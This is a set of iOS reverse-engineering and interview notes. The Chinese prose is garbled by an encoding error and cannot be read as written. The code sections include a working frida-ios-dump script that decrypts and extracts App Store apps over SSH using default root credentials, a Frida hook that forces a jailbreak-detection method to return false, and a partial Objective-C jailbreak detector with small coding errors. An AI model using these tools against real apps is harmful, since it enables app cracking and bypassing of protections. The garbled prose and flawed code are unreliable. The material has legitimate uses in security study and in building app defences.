é¡µé”™è¯¯(Page Fault):åœ¨å½“å‰é¡µä¸­æ‰¾ä¸åˆ°æ‰€éœ€æŒ‡ä»¤ã€‚æ“ä½œç³»ç»Ÿéœ€è¦è®¡ç®—ç›¸åº”é¡µé¢åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„åç§»ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸­åˆ†é…ç‰©ç†é¡µé¢ï¼Œåœ¨è™šæ‹Ÿé¡µå’Œç‰©ç†é¡µå»ºç«‹æ˜ å°„å…³ç³»ã€‚ç¨‹åºæ‰èƒ½ä»å‘ç”Ÿé¡µé¢é”™è¯¯çš„ä½ç½®é‡æ–°æ‰§è¡Œã€‚
å»¶è¿Ÿç»‘å®š(Lazy Binding):å‡½æ•°ç¬¬ä¸€æ¬¡è¢«ä½¿ç”¨æ—¶æ‰è¿›è¡Œç»‘å®š(ç¬¦å·æŸ¥æ‰¾ï¼Œé‡å®šä½ç­‰)ã€‚

 ```
 
 ## Clangç¼–è¯‘å™¨
 ```
Clangæ˜¯LLVMé¡¹ç›®ä¸­çš„ä¸€ä¸ªå­é¡¹ç›®ã€‚å®ƒæ˜¯åŸºäºLLVMæ¶æ„çš„è½»é‡çº§ç¼–è¯‘å™¨ï¼Œè¯ç”Ÿä¹‹åˆæ˜¯ä¸ºäº†æ›¿ä»£GCCï¼Œ
æä¾›æ›´å¿«çš„ç¼–è¯‘é€Ÿåº¦ã€‚å®ƒæ˜¯è´Ÿè´£ç¼–è¯‘Cã€C++ã€Objecte Cè¯­è¨€çš„ç¼–è¯‘å™¨ï¼Œå®ƒå±äºæ•´ä¸ªLLVMæ¶æ„ä¸­çš„ç¼–è¯‘å™¨å‰ç«¯ã€‚
 ```
 
 ## iOSç³»ç»Ÿå“åº”äº‹ä»¶æœºåˆ¶
 ```
 1.æ‰‹æŒ‡è§¦ç¢°å±å¹•ï¼Œå±å¹•æ„Ÿåº”åˆ°è§¦ç¢°åï¼Œå°†äº‹ä»¶äº¤ç”±IOKitå¤„ç†ã€‚

 2.IOKitå°†è§¦æ‘¸äº‹ä»¶å°è£…æˆä¸€ä¸ªIOHIDEventå¯¹è±¡ï¼Œå¹¶é€šè¿‡mach portä¼ é€’ç»™SpringBoadè¿›ç¨‹ã€‚
   mach port è¿›ç¨‹ç«¯å£ï¼Œå„è¿›ç¨‹ä¹‹é—´é€šè¿‡å®ƒè¿›è¡Œé€šä¿¡ã€‚
   SpringBoad.app æ˜¯ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œå¯ä»¥ç†è§£ä¸ºæ¡Œé¢ç³»ç»Ÿï¼Œå¯ä»¥ç»Ÿä¸€ç®¡ç†å’Œåˆ†å‘ç³»ç»Ÿæ¥æ”¶åˆ°çš„è§¦æ‘¸äº‹ä»¶ã€‚

 3. SpringBoardè¿›ç¨‹å› æ¥æ”¶åˆ°è§¦æ‘¸äº‹ä»¶ï¼Œè§¦å‘äº†ä¸»çº¿ç¨‹runloopçš„source1äº‹ä»¶æºçš„å›è°ƒã€‚

æ­¤æ—¶SpringBoardä¼šæ ¹æ®å½“å‰æ¡Œé¢çš„çŠ¶æ€ï¼Œåˆ¤æ–­åº”è¯¥ç”±è°å¤„ç†æ­¤æ¬¡è§¦æ‘¸äº‹ä»¶ã€‚
å› ä¸ºäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œä½ å¯èƒ½æ­£åœ¨æ¡Œé¢ä¸Šç¿»é¡µï¼Œä¹Ÿå¯èƒ½æ­£åœ¨åˆ·å¾®åšã€‚
è‹¥æ˜¯å‰è€…ï¼ˆå³å‰å°æ— APPè¿è¡Œï¼‰ï¼Œ
åˆ™è§¦å‘SpringBoardæœ¬èº«ä¸»çº¿ç¨‹runloopçš„source0äº‹ä»¶æºçš„å›è°ƒï¼Œ
å°†äº‹ä»¶äº¤ç”±æ¡Œé¢ç³»ç»Ÿå»æ¶ˆè€—ï¼›è‹¥æ˜¯åè€…ï¼ˆå³æœ‰appæ­£åœ¨å‰å°è¿è¡Œï¼‰ï¼Œ
åˆ™å°†è§¦æ‘¸äº‹ä»¶é€šè¿‡IPCä¼ é€’ç»™å‰å°APPè¿›ç¨‹
```

# iOSåŠ¨æ€åº“æ³¨å…¥æ–¹å¼
```
dylibæ³¨å…¥ä¹Ÿæœ‰ä¸‰ç§æ–¹å¼ï¼š

1.è¶Šç‹±ç¯å¢ƒä¸‹, å°†åŠ¨æ€åº“ä¸Šä¼ åˆ°DynamicLibrariesç›®å½•ä¸‹

2.è¶Šç‹±ç¯å¢ƒä¸‹, ä½¿ç”¨dyldä¸­çš„DYLD_INSERT_LIBRARIESç¯å¢ƒå˜é‡

3.å…è¶Šç‹±ç¯å¢ƒä¸‹, ä½¿ç”¨optoolæˆ–è€…yololibå·¥å…·ç»™machoæ–°å¢Load command
```

## class-dumpç±»å¯¹å…³é”®å±æ€§åå’Œæ–¹æ³•ååšæ··æ·†å¤„ç† æ€ä¹ˆåŠ?
### iOSé€†å‘é™æ€åˆ†æå·¥å…·å¤§æ¦‚æŸ¥çœ‹å®ƒçš„å®ç°é€»è¾‘
```
é™æ€åˆ†æå·¥å…·æ˜¯èƒ½å¤Ÿå°†machoæ–‡ä»¶çš„æœºå™¨è¯­è¨€ä»£ç åç¼–è¯‘æˆæ±‡ç¼–ä»£ç ã€OCä¼ªä»£ç æˆ–è€…Swiftä¼ªä»£ç ï¼ŒåŒæ—¶å¯ä»¥å¿«é€ŸæŸ¥çœ‹å…³é”®å­—ç¬¦ä¸²ä¿¡æ¯ã€‚
è¿™å°±å¾ˆå¼ºå¤§äº†ï¼Œæ„å‘³ç€å¯ä»¥é€šè¿‡æŸ¥çœ‹æ–¹æ³•çš„æ‰§è¡Œæµç¨‹ï¼Œåˆ¤æ–­æ¡ä»¶ç­‰ä¿¡æ¯æ˜ç™½å®ƒåœ¨åšä»€ä¹ˆï¼Œå¦‚æœæœ¬åœ°å­—ç¬¦ä¸²æœªåšæ··æ·†ï¼Œ
ä¹Ÿå¯ä»¥ç›´æ¥è¢«è·å–åˆ°(æ¯”å¦‚æœ‰äº›appç§˜é’¥æ˜æ–‡å­˜å‚¨æœ¬åœ°ï¼Œè¿™å°±å±é™©äº†)ã€‚

iOSå¹³å°ä¸»è¦ä½¿ç”¨çš„é™æ€åˆ†æå·¥å…·æœ‰Hopperå’ŒIDAã€‚
IDAæ›´å¼ºå¤§ï¼Œå®ƒèƒ½å¤Ÿç¿»è¯‘æˆçš„ä¼ªä»£ç æ›´æ¥è¿‘äºé«˜çº§è¯­è¨€ï¼Œä½†æ˜¯å®ƒçš„æ”¶è´¹ä¹Ÿæ˜¯æ˜‚è´µçš„ã€‚
Hopperè™½ç„¶ä¸å¦‚IDAå¼ºå¤§ï¼Œä½†ä¹Ÿæ˜¯å¤Ÿç”¨çš„äº†ï¼Œæ‰€ä»¥æˆ‘ä¸ªäººä½¿ç”¨çš„æ˜¯Hopperã€‚
æŠŠMach-Oæ–‡ä»¶ç›´æ¥æ‹–å…¥Hopperï¼Œå°è¯•æœç´¢ä½ æ„Ÿå…´è¶£æˆ–è€…å¤´æ–‡ä»¶ä¸­å­˜åœ¨çš„å­—ç¬¦ï¼Œä¼šå¾—åˆ°å¦‚ä¸‹ç•Œé¢
```

## iOSé€†å‘åŠ¨æ€è°ƒè¯•å·¥å…·
```
åŠ¨æ€è°ƒè¯•å°±æ˜¯å°†ç¨‹åºè¿è¡Œèµ·æ¥ï¼Œé€šè¿‡æ‰“æ–­ç‚¹(LLDBéœ€è¦)ã€æ‰“å°ç­‰æ–¹å¼ï¼ŒæŸ¥çœ‹å‚æ•°ã€è¿”å›å€¼ã€å‡½æ•°è°ƒç”¨æµç¨‹ç­‰ä¿¡æ¯ï¼Œ
é€šè¿‡è¾“å‡ºç•Œé¢ä¿¡æ¯è¿…é€Ÿå®šä½ç›®æ ‡ä»£ç ï¼Œè¿˜å¯ä»¥åŠ¨æ€çš„ä¿®æ”¹å†…å­˜å’Œå¯„å­˜å™¨ä¸­çš„å‚æ•°ï¼Œè¾¾åˆ°ç»•è¿‡æ£€æµ‹ï¼Œæ›´æ”¹æ‰§è¡Œæµç¨‹ç­‰ç›®çš„ã€‚
åŠ¨æ€è°ƒè¯•ä¸»è¦æœ‰LLDBå’ŒCyCriptä¸¤ç§å·¥å…·ï¼Œä¸¤ç§éƒ½å¾ˆå¥½å¼ºå¤§ï¼Œä¹Ÿå„æœ‰å„çš„å¥½ï¼Œå»ºè®®ä¸¤ç§æ–¹å¼éƒ½éœ€è¦å­¦ä¹ ã€‚

ç¥å™¨FLEXç•Œé¢è°ƒè¯•UI
```

## iOS å›¾å½¢æ¸²æŸ“

```
UIKitï¼šé€šè¿‡UIKitæä¾›çš„è¡—äº¤å£è¿›è¡Œå¸ƒå±€å’Œç»˜åˆ¶ç•Œé¢ï¼ŒUIKitæœ¬èº«ä¸å…·å¤‡æ˜¾ç¤ºèƒ½åŠ›ï¼Œæ˜¯é€šè¿‡åº•å±‚çš„layerå®ç°çš„ã€‚


CoreAnimationï¼šæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¤åˆå¼•æ“ï¼Œä¸»è¦èŒè´£åœ¨äºæ¸²æŸ“ï¼Œæ„å»ºå’ŒåŠ¨ç”»ã€‚CAlayerå±äºCoreAnimationï¼Œæ˜¯ç•Œé¢å¯è§†åŒ–çš„æ‰¿è½½ã€‚


CoreGraphicsï¼šåŸºäºQuartzçš„é«˜çº§ç»˜å›¾å¼•æ“ï¼Œæä¾›äº†è½»é‡çº§çš„2dæ¸²æŸ“èƒ½åŠ›ï¼Œä¸»è¦æ˜¯ç”¨äºè¿è¡Œæ—¶ç»˜å›¾çš„ã€‚CGå¼€å¤´çš„ç±»éƒ½å±äºCoreGraphicsã€‚


CoreImageï¼šä¸€ä¸ªé«˜æ€§èƒ½çš„å›¾åƒå¤„ç†åˆ†æçš„æ¡†æ¶ï¼Œè¿è¡Œå‰ç»˜åˆ¶å›¾å½¢ï¼Œä¸»è¦æä¾›å›¾å½¢çš„æ»¤é•œåŠŸèƒ½ã€‚


OpenGL ESï¼šé’ˆå¯¹åµŒå…¥å¼è®¾å¤‡ï¼Œæ˜¯OpenGLçš„å­é›†ã€‚ç›´æ¥æ“ä½œç¡¬ä»¶æœåŠ¡ï¼Œæ˜¯è·¨å¹³å°çš„ã€‚


Metalï¼šè‹¹æœè‡ªç ”çš„é’ˆå¯¹è‡ªå®¶è®¾å¤‡çš„å›¾å½¢æ¸²æŸ“æ ‡å‡†ï¼Œåœ¨è‹¹æœè®¾å¤‡ä¸Šæ€§èƒ½æœ€ä¼˜ã€‚
```

## æµ…è°ˆiOS ipaç ¸å£³çŸ¥è¯†
```
App Storeä¸Šä¸‹è½½çš„åŒ…
è‹¹æœä¼šå¯¹Mach-Oé‡Œé¢__TETXæ®µé‡Œé¢çš„å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¦‚æœä¸è§£å¯†æ— æ³•åšåç»­æ“ä½œã€‚

æ‰€ä»¥ç ¸å£³dump ipaæŠ€æœ¯å°±åº”è¿è€Œç”Ÿ
ç ¸å£³åˆ†ä¸ºé™æ€ç ¸å£³å’ŒåŠ¨æ€ç ¸å£³

åŠ¨æ€ç ¸å£³çš„åŸç†ä¸»è¦æ˜¯
è™½ç„¶Mach-Oä¸­çš„__TEXTæ®µè¢«è‹¹æœåŠ å¯†äº†ï¼Œ
ä½†æ˜¯ç³»ç»Ÿå¦‚æœè¦è¿è¡Œç¨‹åºï¼Œè‚¯å®šéœ€è¦å¯¹å†…å®¹è¿›è¡Œè§£å¯†ã€‚
æ‰€ä»¥å°±ä¸å»ä¸»åŠ¨çš„ç ¸æ‰åŸæœ‰çš„åŠ å¯†å£³ï¼Œè€Œæ˜¯å½“åº”ç”¨ç¨‹åºæ‰“å¼€è¿è¡Œåï¼Œå£³è¢«ç³»ç»Ÿè‡ªåŠ¨è§£å¯†åï¼Œ
åœ¨å†…å­˜ä¸­æŠŠè§£å¯†åçš„æ•°æ®äºŒè¿›åˆ¶æ–‡ä»¶æå–å‡ºæ¥ï¼Œä¹Ÿå°±è¾¾åˆ°äº†ç ¸å£³çš„ç›®çš„ã€‚
(æ‰‹æœºç«¯æ’ä»¶CrackerXIç ¸å£³, frida-ios-dumpç”µè„‘ç ¸å£³)
iOSåˆ©ç”¨CrackerXIï¼ˆè„±å£³ï¼‰: https://www.jianshu.com/p/97a97ff81384
```

## iOS AutoreleasePoolåŸç†
```
è‡ªåŠ¨é‡Šæ”¾æ± æœ¬è´¨æ˜¯ä¸€ä¸ªAutoreleasePoolPageç»“æ„ä½“å¯¹è±¡ï¼Œæ ˆç»“æ„å­˜å‚¨ï¼Œæ¯ä¸€ä¸ªAutoreleasePoolPageä»¥åŒå‘é“¾è¡¨å½¢å¼è¿æ¥
è‡ªåŠ¨é‡Šæ”¾çš„å‹æ ˆå’Œå‡ºæ ˆæœ¬è´¨ä¸Šæ˜¯è°ƒç”¨AutoreleasePoolPageçš„pushå’Œpopæ–¹æ³•
push å‹æ ˆ
åˆ¤æ–­hotPageæ˜¯å¦å­˜åœ¨
ä¸å­˜åœ¨ï¼ŒautoreleaseNoPageåˆ›å»ºæ–°hotPageï¼Œè°ƒç”¨addæ–¹æ³•å°†å¯¹è±¡æ·»åŠ è‡³pageæ ˆä¸­
å­˜åœ¨æ»¡äº†ï¼ŒautoreleaseFullPageåˆå§‹æ–°çš„page
å­˜åœ¨æ²¡æ»¡ï¼Œè°ƒç”¨addæ–¹æ³•å°†å¯¹è±¡æ·»åŠ åˆ°pageçš„nextæŒ‡é’ˆï¼ŒnextæŒ‡é’ˆ++
pop å‡ºæ ˆ
æ‰§è¡Œpopå‡ºæ ˆæ—¶ï¼Œä¼šä¼ å…¥pushæ“ä½œçš„è¿”å›å€¼ï¼Œå³POOL_BOUNDARYçš„å†…å­˜åœ°å€tokenï¼Œæ ¹æ®tokenæ‰¾åˆ°å“¨å…µå¯¹è±¡æ‰€åœ¨ï¼Œå¹¶é‡Šæ”¾ä¹‹å‰çš„å¯¹è±¡ï¼ŒnextæŒ‡é’ˆ--
```

## å“åº”å¼ç¼–ç¨‹
```
ä¹Ÿå«åšå£°æ˜å¼ç¼–ç¨‹ï¼Œè¿™æ˜¯ç°åœ¨å‰ç«¯å¼€å‘çš„ä¸»æµï¼Œå½“ç„¶å¯¹äºå®¢æˆ·ç«¯å¼€å‘çš„ä¸€ç§è¶‹åŠ¿ï¼Œæ¯”å¦‚SwiftUI ã€‚

å“åº”å¼ç®€å•æ¥è¯´å…¶å®å°±æ˜¯ä½ ä¸éœ€è¦æ‰‹åŠ¨æ›´æ–°ç•Œé¢ï¼Œåªéœ€è¦æŠŠç•Œé¢é€šè¿‡ä»£ç â€œå£°æ˜â€å¥½ï¼Œç„¶åæŠŠæ•°æ®å’Œç•Œé¢çš„å…³ç³»æ¥å¥½ï¼Œæ•°æ®æ›´æ–°äº†ç•Œé¢è‡ªç„¶å°±æ›´æ–°äº†ã€‚
ä»ä»£ç å±‚é¢çœ‹ï¼Œå¯¹äºåŸç”Ÿå¼€å‘è€Œè¨€ï¼Œæ²¡æœ‰ xml çš„å¸ƒå±€ï¼Œæ²¡æœ‰ storyboardï¼Œå¸ƒå±€å®Œå…¨ç”±ä»£ç å®Œæˆï¼Œæ‰€è§å³æ‰€å¾—ï¼Œ
åŒæ—¶ä¹Ÿä¸ä¼šéœ€è¦æ“ä½œç•Œé¢â€œå¯¹è±¡â€å»è¿›è¡Œèµ‹å€¼å’Œæ›´æ–°ï¼Œä½ æ‰€éœ€è¦åšçš„å°±æ˜¯é…ç½®æ•°æ®å’Œç•Œé¢çš„å…³ç³»ã€‚

å“åº”å¼å¼€å‘æ¯”æ•°æ®ç»‘å®šæˆ–è€… MVVM ä¸åŒçš„åœ°æ–¹æ˜¯ï¼Œå®ƒæ¯æ¬¡éƒ½æ˜¯é‡æ–°æ„å»ºå’Œè°ƒæ•´æ•´ä¸ªæ¸²æŸ“æ ‘ï¼Œè€Œä¸æ˜¯ç®€å•çš„å¯¹ UI è¿›è¡Œ visibility æ“ä½œã€‚
```

## python3-frida-ios-hook-jailbreak
```
#!/usr/bin/env python3

import sys
import codecs
import frida
import threading
import os
import shutil
import time
import argparse
import tempfile
import subprocess
import re

import paramiko
from paramiko import SSHClient
from scp import SCPClient
from tqdm import tqdm
import traceback
from log import *

script_dir = os.path.dirname(os.path.realpath(__file__))

DUMP_JS = os.path.join(script_dir, '../../methods/dump.js')

User = 'root'
Password = 'alpine'
Host = 'localhost'
Port = 2222

TEMP_DIR = tempfile.gettempdir()
PAYLOAD_DIR = 'Payload'
PAYLOAD_PATH = os.path.join(TEMP_DIR, PAYLOAD_DIR)
file_dict = {}

finished = threading.Event()


def get_usb_iphone():
    Type = 'usb'
    if int(frida.__version__.split('.')[0]) < 12:
        Type = 'tether'
    device_manager = frida.get_device_manager()
    changed = threading.Event()

    def on_changed():
        changed.set()

    device_manager.on('changed', on_changed)

    device = None
    while device is None:
        devices = [dev for dev in device_manager.enumerate_devices() if dev.type == Type]
        if len(devices) == 0:
            print('Waiting for USB device...')
            changed.wait()
        else:
            device = devices[0]

    device_manager.off('changed', on_changed)

    return device


def generate_ipa(path, display_name):
    ipa_filename = display_name + '.ipa'

    logger.info('Generating "{}"'.format(ipa_filename))
    try:
        app_name = file_dict['app']

        for key, value in file_dict.items():
            from_dir = os.path.join(path, key)
            to_dir = os.path.join(path, app_name, value)
            if key != 'app':
                shutil.move(from_dir, to_dir)

        target_dir = './' + PAYLOAD_DIR
        zip_args = ('zip', '-qr', os.path.join(os.getcwd(), ipa_filename), target_dir)
        subprocess.check_call(zip_args, cwd=TEMP_DIR)
        shutil.rmtree(PAYLOAD_PATH)
    except Exception as e:
        print(e)
        finished.set()

def on_message(message, data):
    t = tqdm(unit='B',unit_scale=True,unit_divisor=1024,miniters=1)
    last_sent = [0]

    def progress(filename, size, sent):
        t.desc = os.path.basename(filename).decode("utf-8")
        t.total = size
        t.update(sent - last_sent[0])
        last_sent[0] = 0 if size == sent else sent

    if 'payload' in message:
        payload = message['payload']
        if 'dump' in payload:
            origin_path = payload['path']
            dump_path = payload['dump']

            scp_from = dump_path
            scp_to = PAYLOAD_PATH + '/'

            with SCPClient(ssh.get_transport(), progress = progress, socket_timeout = 60) as scp:
                scp.get(scp_from, scp_to)

            chmod_dir = os.path.join(PAYLOAD_PATH, os.path.basename(dump_path))
            chmod_args = ('chmod', '655', chmod_dir)
            try:
                subprocess.check_call(chmod_args)
            except subprocess.CalledProcessError as err:
                print(err)

            index = origin_path.find('.app/')
            file_dict[os.path.basename(dump_path)] = origin_path[index + 5:]

        if 'app' in payload:
            app_path = payload['app']

            scp_from = app_path
            scp_to = PAYLOAD_PATH + '/'
            with SCPClient(ssh.get_transport(), progress = progress, socket_timeout = 60) as scp:
                scp.get(scp_from, scp_to, recursive=True)

            chmod_dir = os.path.join(PAYLOAD_PATH, os.path.basename(app_path))
            chmod_args = ('chmod', '755', chmod_dir)
            try:
                subprocess.check_call(chmod_args)
            except subprocess.CalledProcessError as err:
                print(err)

            file_dict['app'] = os.path.basename(app_path)

        if 'done' in payload:
            finished.set()
    t.close()

def compare_applications(a, b):
    a_is_running = a.pid != 0
    b_is_running = b.pid != 0
    if a_is_running == b_is_running:
        if a.name > b.name:
            return 1
        elif a.name < b.name:
            return -1
        else:
            return 0
    elif a_is_running:
        return -1
    else:
        return 1


def get_applications(device):
    try:
        applications = device.enumerate_applications()
    except Exception as e:
        sys.exit('Failed to enumerate applications: %s' % e)

    return applications


def load_js_file(session, filename):
    source = ''
    with codecs.open(filename, 'r', 'utf-8') as f:
        source = source + f.read()
    script = session.create_script(source)
    script.on('message', on_message)
    script.load()

    return script


def create_dir(path):
    path = path.strip()
    path = path.rstrip('\\')
    if os.path.exists(path):
        shutil.rmtree(path)
    try:
        os.makedirs(path)
    except os.error as err:
        print(err)


def open_target_app(device, name_or_bundleid):
    logger.info('Start the target app {}'.format(name_or_bundleid))

    pid = ''
    session = None
    display_name = ''
    bundle_identifier = ''
    for application in get_applications(device):
        if name_or_bundleid == application.identifier or name_or_bundleid == application.name:
            pid = application.pid
            display_name = application.name
            bundle_identifier = application.identifier

    try:
        if not pid:
            pid = device.spawn([bundle_identifier])
            session = device.attach(pid)
            device.resume(pid)
        else:
            session = device.attach(pid)
    except Exception as e:
        print(e) 

    return session, display_name, bundle_identifier


def start_dump(session, ipa_name):
    logger.info('Dumping {} to {}'.format(display_name, TEMP_DIR))

    script = load_js_file(session, DUMP_JS)
    script.post('dump')
    finished.wait()

    generate_ipa(PAYLOAD_PATH, ipa_name)

    if session:
        session.detach()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='frida-ios-dump (by AloneMonkey v2.0)')
    parser.add_argument('-l', '--list', dest='list_applications', action='store_true', help='List the installed apps')
    parser.add_argument('-o', '--output', dest='output_ipa', help='Specify name of the decrypted IPA')
    parser.add_argument('target', nargs='?', help='Bundle identifier or display name of the target app')
    args = parser.parse_args()

    exit_code = 0
    ssh = None

    if not len(sys.argv[1:]):
        parser.print_help()
        sys.exit(exit_code)

    device = get_usb_iphone()

    if args.list_applications:
        list_applications(device)
    else:
        name_or_bundleid = args.target
        output_ipa = args.output_ipa

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(Host, port=Port, username=User, password=Password)

            create_dir(PAYLOAD_PATH)
            (session, display_name, bundle_identifier) = open_target_app(device, name_or_bundleid)
            if output_ipa is None:
                output_ipa = display_name
            output_ipa = re.sub('\.ipa$', '', output_ipa)
            if session:
                start_dump(session, output_ipa)
        except paramiko.ssh_exception.NoValidConnectionsError as e:
            print(e) 
            exit_code = 1
        except paramiko.AuthenticationException as e:
            print(e) 
            exit_code = 1
        except Exception as e:
            print('*** Caught exception: %s: %s' % (e.__class__, e))
            traceback.print_exc()
            exit_code = 1

    if ssh:
        ssh.close()

    if os.path.exists(PAYLOAD_PATH):
        shutil.rmtree(PAYLOAD_PATH)

    sys.exit(exit_code)
```

## å±è”½è¶Šç‹±æ£€æµ‹è„šæœ¬
```
function bypassJailbreakDetection() {
	try {
		var className = "JailbreakDetection";
        var funcName = "+ isJail";
        var hook = eval('ObjC.classes.' + className + '["' + funcName + '"]');
        Interceptor.attach(hook.implementation, {
          onLeave: function(retval) {
            console.log("[*] Class Name: " + className);
            console.log("[*] Method Name: " + funcName);
            console.log("\t[-] Type of return value: " + typeof retval);
            console.log("\t[-] Original Return Value: " + retval);
            retval.replace(0x0);
            console.log("\t[-] Type of return value: " + typeof retval);
            console.log("\t[-] Return Value: " + retval);
          }
        });
        
	} catch(err) {
		console.log("[-] Error: " + err.message);
	}
}

if (ObjC.available) {
	bypassJailbreakDetection();
} else {
 	send("error: Objective-C Runtime is not available!");
}
```

## åiOSè¶Šç‹±æ£€æµ‹
```
#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>
#import <objc/runtime.h>
#import <objc/message.h>
#include <stdio.h>
#import <dlfcn.h>
#import <sys/types.h>

static char *JbPaths[] = {"/Applications/Cydia.app",
    "/usr/sbin/sshd",
    "/bin/bash",
    "/etc/apt",
    "/Library/MobileSubstrate",
    "/User/Applications/"};

static NSSet *sDylibSet ; // éœ€è¦æ£€æµ‹çš„åŠ¨æ€åº“
static BOOL SCHECK_USER = NO; /// æ£€æµ‹æ˜¯å¦è¶Šç‹±

@implementation UserCust


+ (void)load {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    sDylibSet  = [NSSet setWithObjects:
                       @"/usr/lib/CepheiUI.framework/CepheiUI",
                       @"/usr/lib/libsubstitute.dylib",
                       @"/usr/lib/substitute-inserter.dylib",
                       @"/usr/lib/substitute-loader.dylib",
                       @"/usr/lib/substrate/SubstrateLoader.dylib",
                       @"/usr/lib/substrate/SubstrateInserter.dylib",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/Library/MobileSubstrate/DynamicLibraries/0Shadow.dylib",
                  
                  nil];
    _dyld_register_func_for_add_image(_check_image);
  });
}

+ (instancetype)sharedInstance {
    
    static id sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [self new];
    });
    return sharedInstance;
}

// ç›‘å¬imageåŠ è½½ï¼Œä»è¿™é‡Œåˆ¤æ–­åŠ¨æ€åº“æ˜¯å¦åŠ è½½ï¼Œå› ä¸ºå…¶ä»–çš„æ£€æµ‹åŠ¨æ€åº“çš„æ–¹æ¡ˆä¼šè¢«hook
static void _check_image(const struct mach_header *header,
                                      intptr_t slide) {
  // hook Image load
  if (SCHECK_USER) {
    // æ£€æµ‹åå°±ä¸åœ¨æ£€æµ‹
    return;
  }

  // æ£€æµ‹çš„lib
  Dl_info info;
  // 0è¡¨ç¤ºåŠ è½½å¤±è´¥äº†ï¼Œè¿™é‡Œå¤§æ¦‚ç‡æ˜¯è¢«hookå¯¼è‡´çš„
  if (dladdr(header, &info) == 0) {
    char *dlerro = dlerror();
    // è·å–å¤±è´¥äº† ä½†æ˜¯è¿”å›äº†dli_fname, è¯´æ˜è¢«äººhookäº†ï¼Œç›®å‰çœ‹çš„æ–¹æ¡ˆéƒ½æ˜¯ç›´æ¥è¿”å›0æ¥ç»•è¿‡çš„
    if(dlerro == NULL && info.dli_fname != NULL) {
      NSString *libName = [NSString stringWithUTF8String:info.dli_fname];
      // åˆ¤æ–­æœ‰æ²¡æœ‰åœ¨åŠ¨æ€åˆ—è¡¨é‡Œé¢
      if ([sDylibSet containsObject:libName]) {
        SCHECK_USER = YES;
      }
    }
    return;
  }
}


// è¶Šç‹±æ£€æµ‹
- (BOOL)UVItinitse {
  
    if (SCHECK_USER) {
      return YES;
    }

    if (isStatNotSystemLib()) {
        return YES;
    }

    if (isDebugged()) {
        return YES;
    }

    if (isInjectedWithDynamicLibrary()) {
        return YES;
    }

    if (JCheckKuyt()) {
        return YES;
    }

    if (dyldEnvironmentVariables()) {
        return YES;
    }

    return NO;
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

#pragma mark ä½¿ç”¨NSFileManageré€šè¿‡æ£€æµ‹ä¸€äº›è¶Šç‹±åçš„å…³é”®æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®æ¥åˆ¤æ–­æ˜¯å¦è¶Šç‹±
// æ£€æµ‹è¶Šç‹±
BOOL JCheckKuyt()
{
    
    if(TARGET_IPHONE_SIMULATOR)return NO;

    //Check cydia URL hook canOpenURL æ¥ç»•è¿‡
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }

    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]])
    {
        return YES;
    }

    NSArray* checks = [[NSArray alloc] initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app"
                       @"/var/lib/dpkg/info", nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    // hook lstatå¯ä»¥ç»•è¿‡
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            return YES;
        }
    }
  

    //Check process forking
    // hook fork
    int pid = fork();
    if(!pid)
    {
        exit(1);
